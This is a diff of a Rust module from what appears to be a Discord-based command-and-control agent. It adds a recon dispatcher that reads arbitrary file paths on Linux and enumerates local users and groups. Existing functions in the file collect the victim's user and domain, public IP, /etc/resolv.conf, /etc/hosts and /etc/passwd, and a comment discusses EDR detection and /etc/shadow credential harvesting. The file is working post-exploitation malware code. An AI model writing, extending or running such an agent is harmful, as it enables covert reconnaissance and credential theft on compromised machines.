@@ -1,12 +1,66 @@
-use crate::errors::DiscordC2Error;
-use public_ip_addr::get_public_ip;
-
-#[cfg(target_os = "windows")]
 use std::env;
 #[cfg(target_os = "linux")]
-use std::path::Path;
-#[cfg(target_os = "linux")]
-use std::{env, fs};
+use std::{fs, path::Path};
+
+use public_ip_addr::get_public_ip;
+use sysinfo::{System, SystemExt, UserExt};
+
+use crate::errors::DiscordC2Error;
+
+#[derive(Debug)]
+pub enum ReconType {
+	#[cfg(target_os = "linux")]
+	Linux,
+	#[cfg(target_os = "windows")]
+	Windows,
+	Agnostic,
+}
+
+/// Runs a recon command given the command and the ReconType
+///
+/// ### Returns
+/// Returns a String representation containing the result of the command.
+pub fn run_recon(command: &str, recon_type: ReconType) -> String {
+	match recon_type {
+		#[cfg(target_os = "linux")]
+		ReconType::Linux => {
+			// For now, this is okay. As we expand linux commands, we will have to do pattern matching. Example below for Agnostic type.
+			let path = Path::new(&command);
+			return fs::read_to_string(path).unwrap_or("Unknown".to_string());
+		},
+
+		#[cfg(target_os = "windows")]
+		ReconType::Windows => {
+			// No windows specific commands at this time
+			return "not supported".to_string();
+		},
+
+		ReconType::Agnostic => {
+			match command {
+				"userlist" => return sys_info(command),
+				_ => return "Unknown command".to_string(), /* this is really not necessary unless we made a coding mistake, but including it for POC */
+			}
+		},
+	}
+
+	// We will need to trim output according to 2k character limit at a later date. This shouldn't be done here, and should be done instead in the messagee handler.
+	fn sys_info(command: &str) -> String {
+		let mut sys = System::new_all();
+		sys.refresh_all();
+
+		let mut output = String::new();
+
+		match command {
+			"userlist" => {
+				for user in sys.users() {
+					output.push_str(format!("[1;33mUser: {}[0m || [1;32mGroups: {:?}[0m\n", user.name(), user.groups()).as_str())
+				} 
+				output
+			},
+			_ => String::from("Command not supported yet"),
+		}
+	}
+}
 
 /// Retrieves the user information used during agent initialization.
 ///
@@ -18,22 +72,22 @@ use std::{env, fs};
 /// A `String` containing the user information in the format "domain:user".
 #[cfg(target_os = "windows")]
 pub fn user() -> String {
-    let domain = env::var("USERDOMAIN").unwrap_or("Unknown Hostname".to_string());
-    let user = env::var("USERNAME").unwrap_or("Unknown User".to_string());
+	let domain = env::var("USERDOMAIN").unwrap_or("Unknown Hostname".to_string());
+	let user = env::var("USERNAME").unwrap_or("Unknown User".to_string());
 
-    format!("{}:{}", &domain, &user)
+	format!("{}:{}", &domain, &user)
 }
 
 #[cfg(target_os = "linux")]
 pub fn user() -> String {
-    // linux does not really have a concept of AD domains, just return the hostname
-    // from /etc/hostname which usually has a FQDN
-    let binding =
-        fs::read_to_string(Path::new("/etc/hostname")).unwrap_or("Unknown Hostname".to_string());
-    let hostname = binding.trim(); // /etc/hostname has a newline at EOF, need to trim it
-    let user = env::var("USER").unwrap_or("Unknown User".parse().unwrap());
+	// linux does not really have a concept of AD domains, just return the hostname
+	// from /etc/hostname which usually has a FQDN
+	let binding =
+		fs::read_to_string(Path::new("/etc/hostname")).unwrap_or("Unknown Hostname".to_string());
+	let hostname = binding.trim(); // /etc/hostname has a newline at EOF, need to trim it
+	let user = env::var("USER").unwrap_or("Unknown User".parse().unwrap());
 
-    format!("{}:{}", &hostname, &user)
+	format!("{}:{}", &hostname, &user)
 }
 
 /// Retrieves the public IP address during agent initialization.
@@ -45,10 +99,10 @@ pub fn user() -> String {
 ///
 /// The public IP address as a `String`, or an `Err` of type `DiscordC2Error` if there was an error.
 pub async fn ip() -> Result<String, DiscordC2Error> {
-    let ip = get_public_ip()
-        .await
-        .map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
-    Ok(ip)
+	let ip = get_public_ip()
+		.await
+		.map_err(|err| DiscordC2Error::AgentError(err.to_string()))?;
+	Ok(ip)
 }
 
 /// even though the concept of AD doesn't fully exist on linux, you can still kinda domain-join a linux machine to an
@@ -58,20 +112,20 @@ pub async fn ip() -> Result<String, DiscordC2Error> {
 /// available.
 #[cfg(target_os = "linux")]
 pub async fn get_resolv_conf() -> String {
-    let resolv_conf = Path::new("/etc/resolv.conf");
-    let file = fs::read_to_string(resolv_conf).unwrap_or("Unknown".to_string());
+	let resolv_conf = Path::new("/etc/resolv.conf");
+	let file = fs::read_to_string(resolv_conf).unwrap_or("Unknown".to_string());
 
-    file
+	file
 }
 
 /// /etc/hosts contains mappings of IP addresses to FQDNs. if the linux machine is domain joined, this will usually be
 /// populated with things like a DC hostname
 #[cfg(target_os = "linux")]
 pub async fn get_etc_hosts() -> String {
-    let hosts = Path::new("/etc/hosts");
-    let file = fs::read_to_string(hosts).unwrap_or("Unknown".to_string());
+	let hosts = Path::new("/etc/hosts");
+	let file = fs::read_to_string(hosts).unwrap_or("Unknown".to_string());
 
-    file
+	file
 }
 
 /// /etc/passwd contains valuable information about the users on the machine such as the default shells, if accounts are
@@ -79,8 +133,8 @@ pub async fn get_etc_hosts() -> String {
 /// warning: EDRs WILL detect any attempts at reading /etc/passwd for recon, just like /etc/shadow for cred harvesting
 #[cfg(target_os = "linux")]
 pub async fn get_etc_passwd() -> String {
-    let etc_passwd = Path::new("/etc/passwd");
-    let file = fs::read_to_string(etc_passwd).unwrap_or("Unknown".to_string());
+	let etc_passwd = Path::new("/etc/passwd");
+	let file = fs::read_to_string(etc_passwd).unwrap_or("Unknown".to_string());
 
-    file
+	file
 }
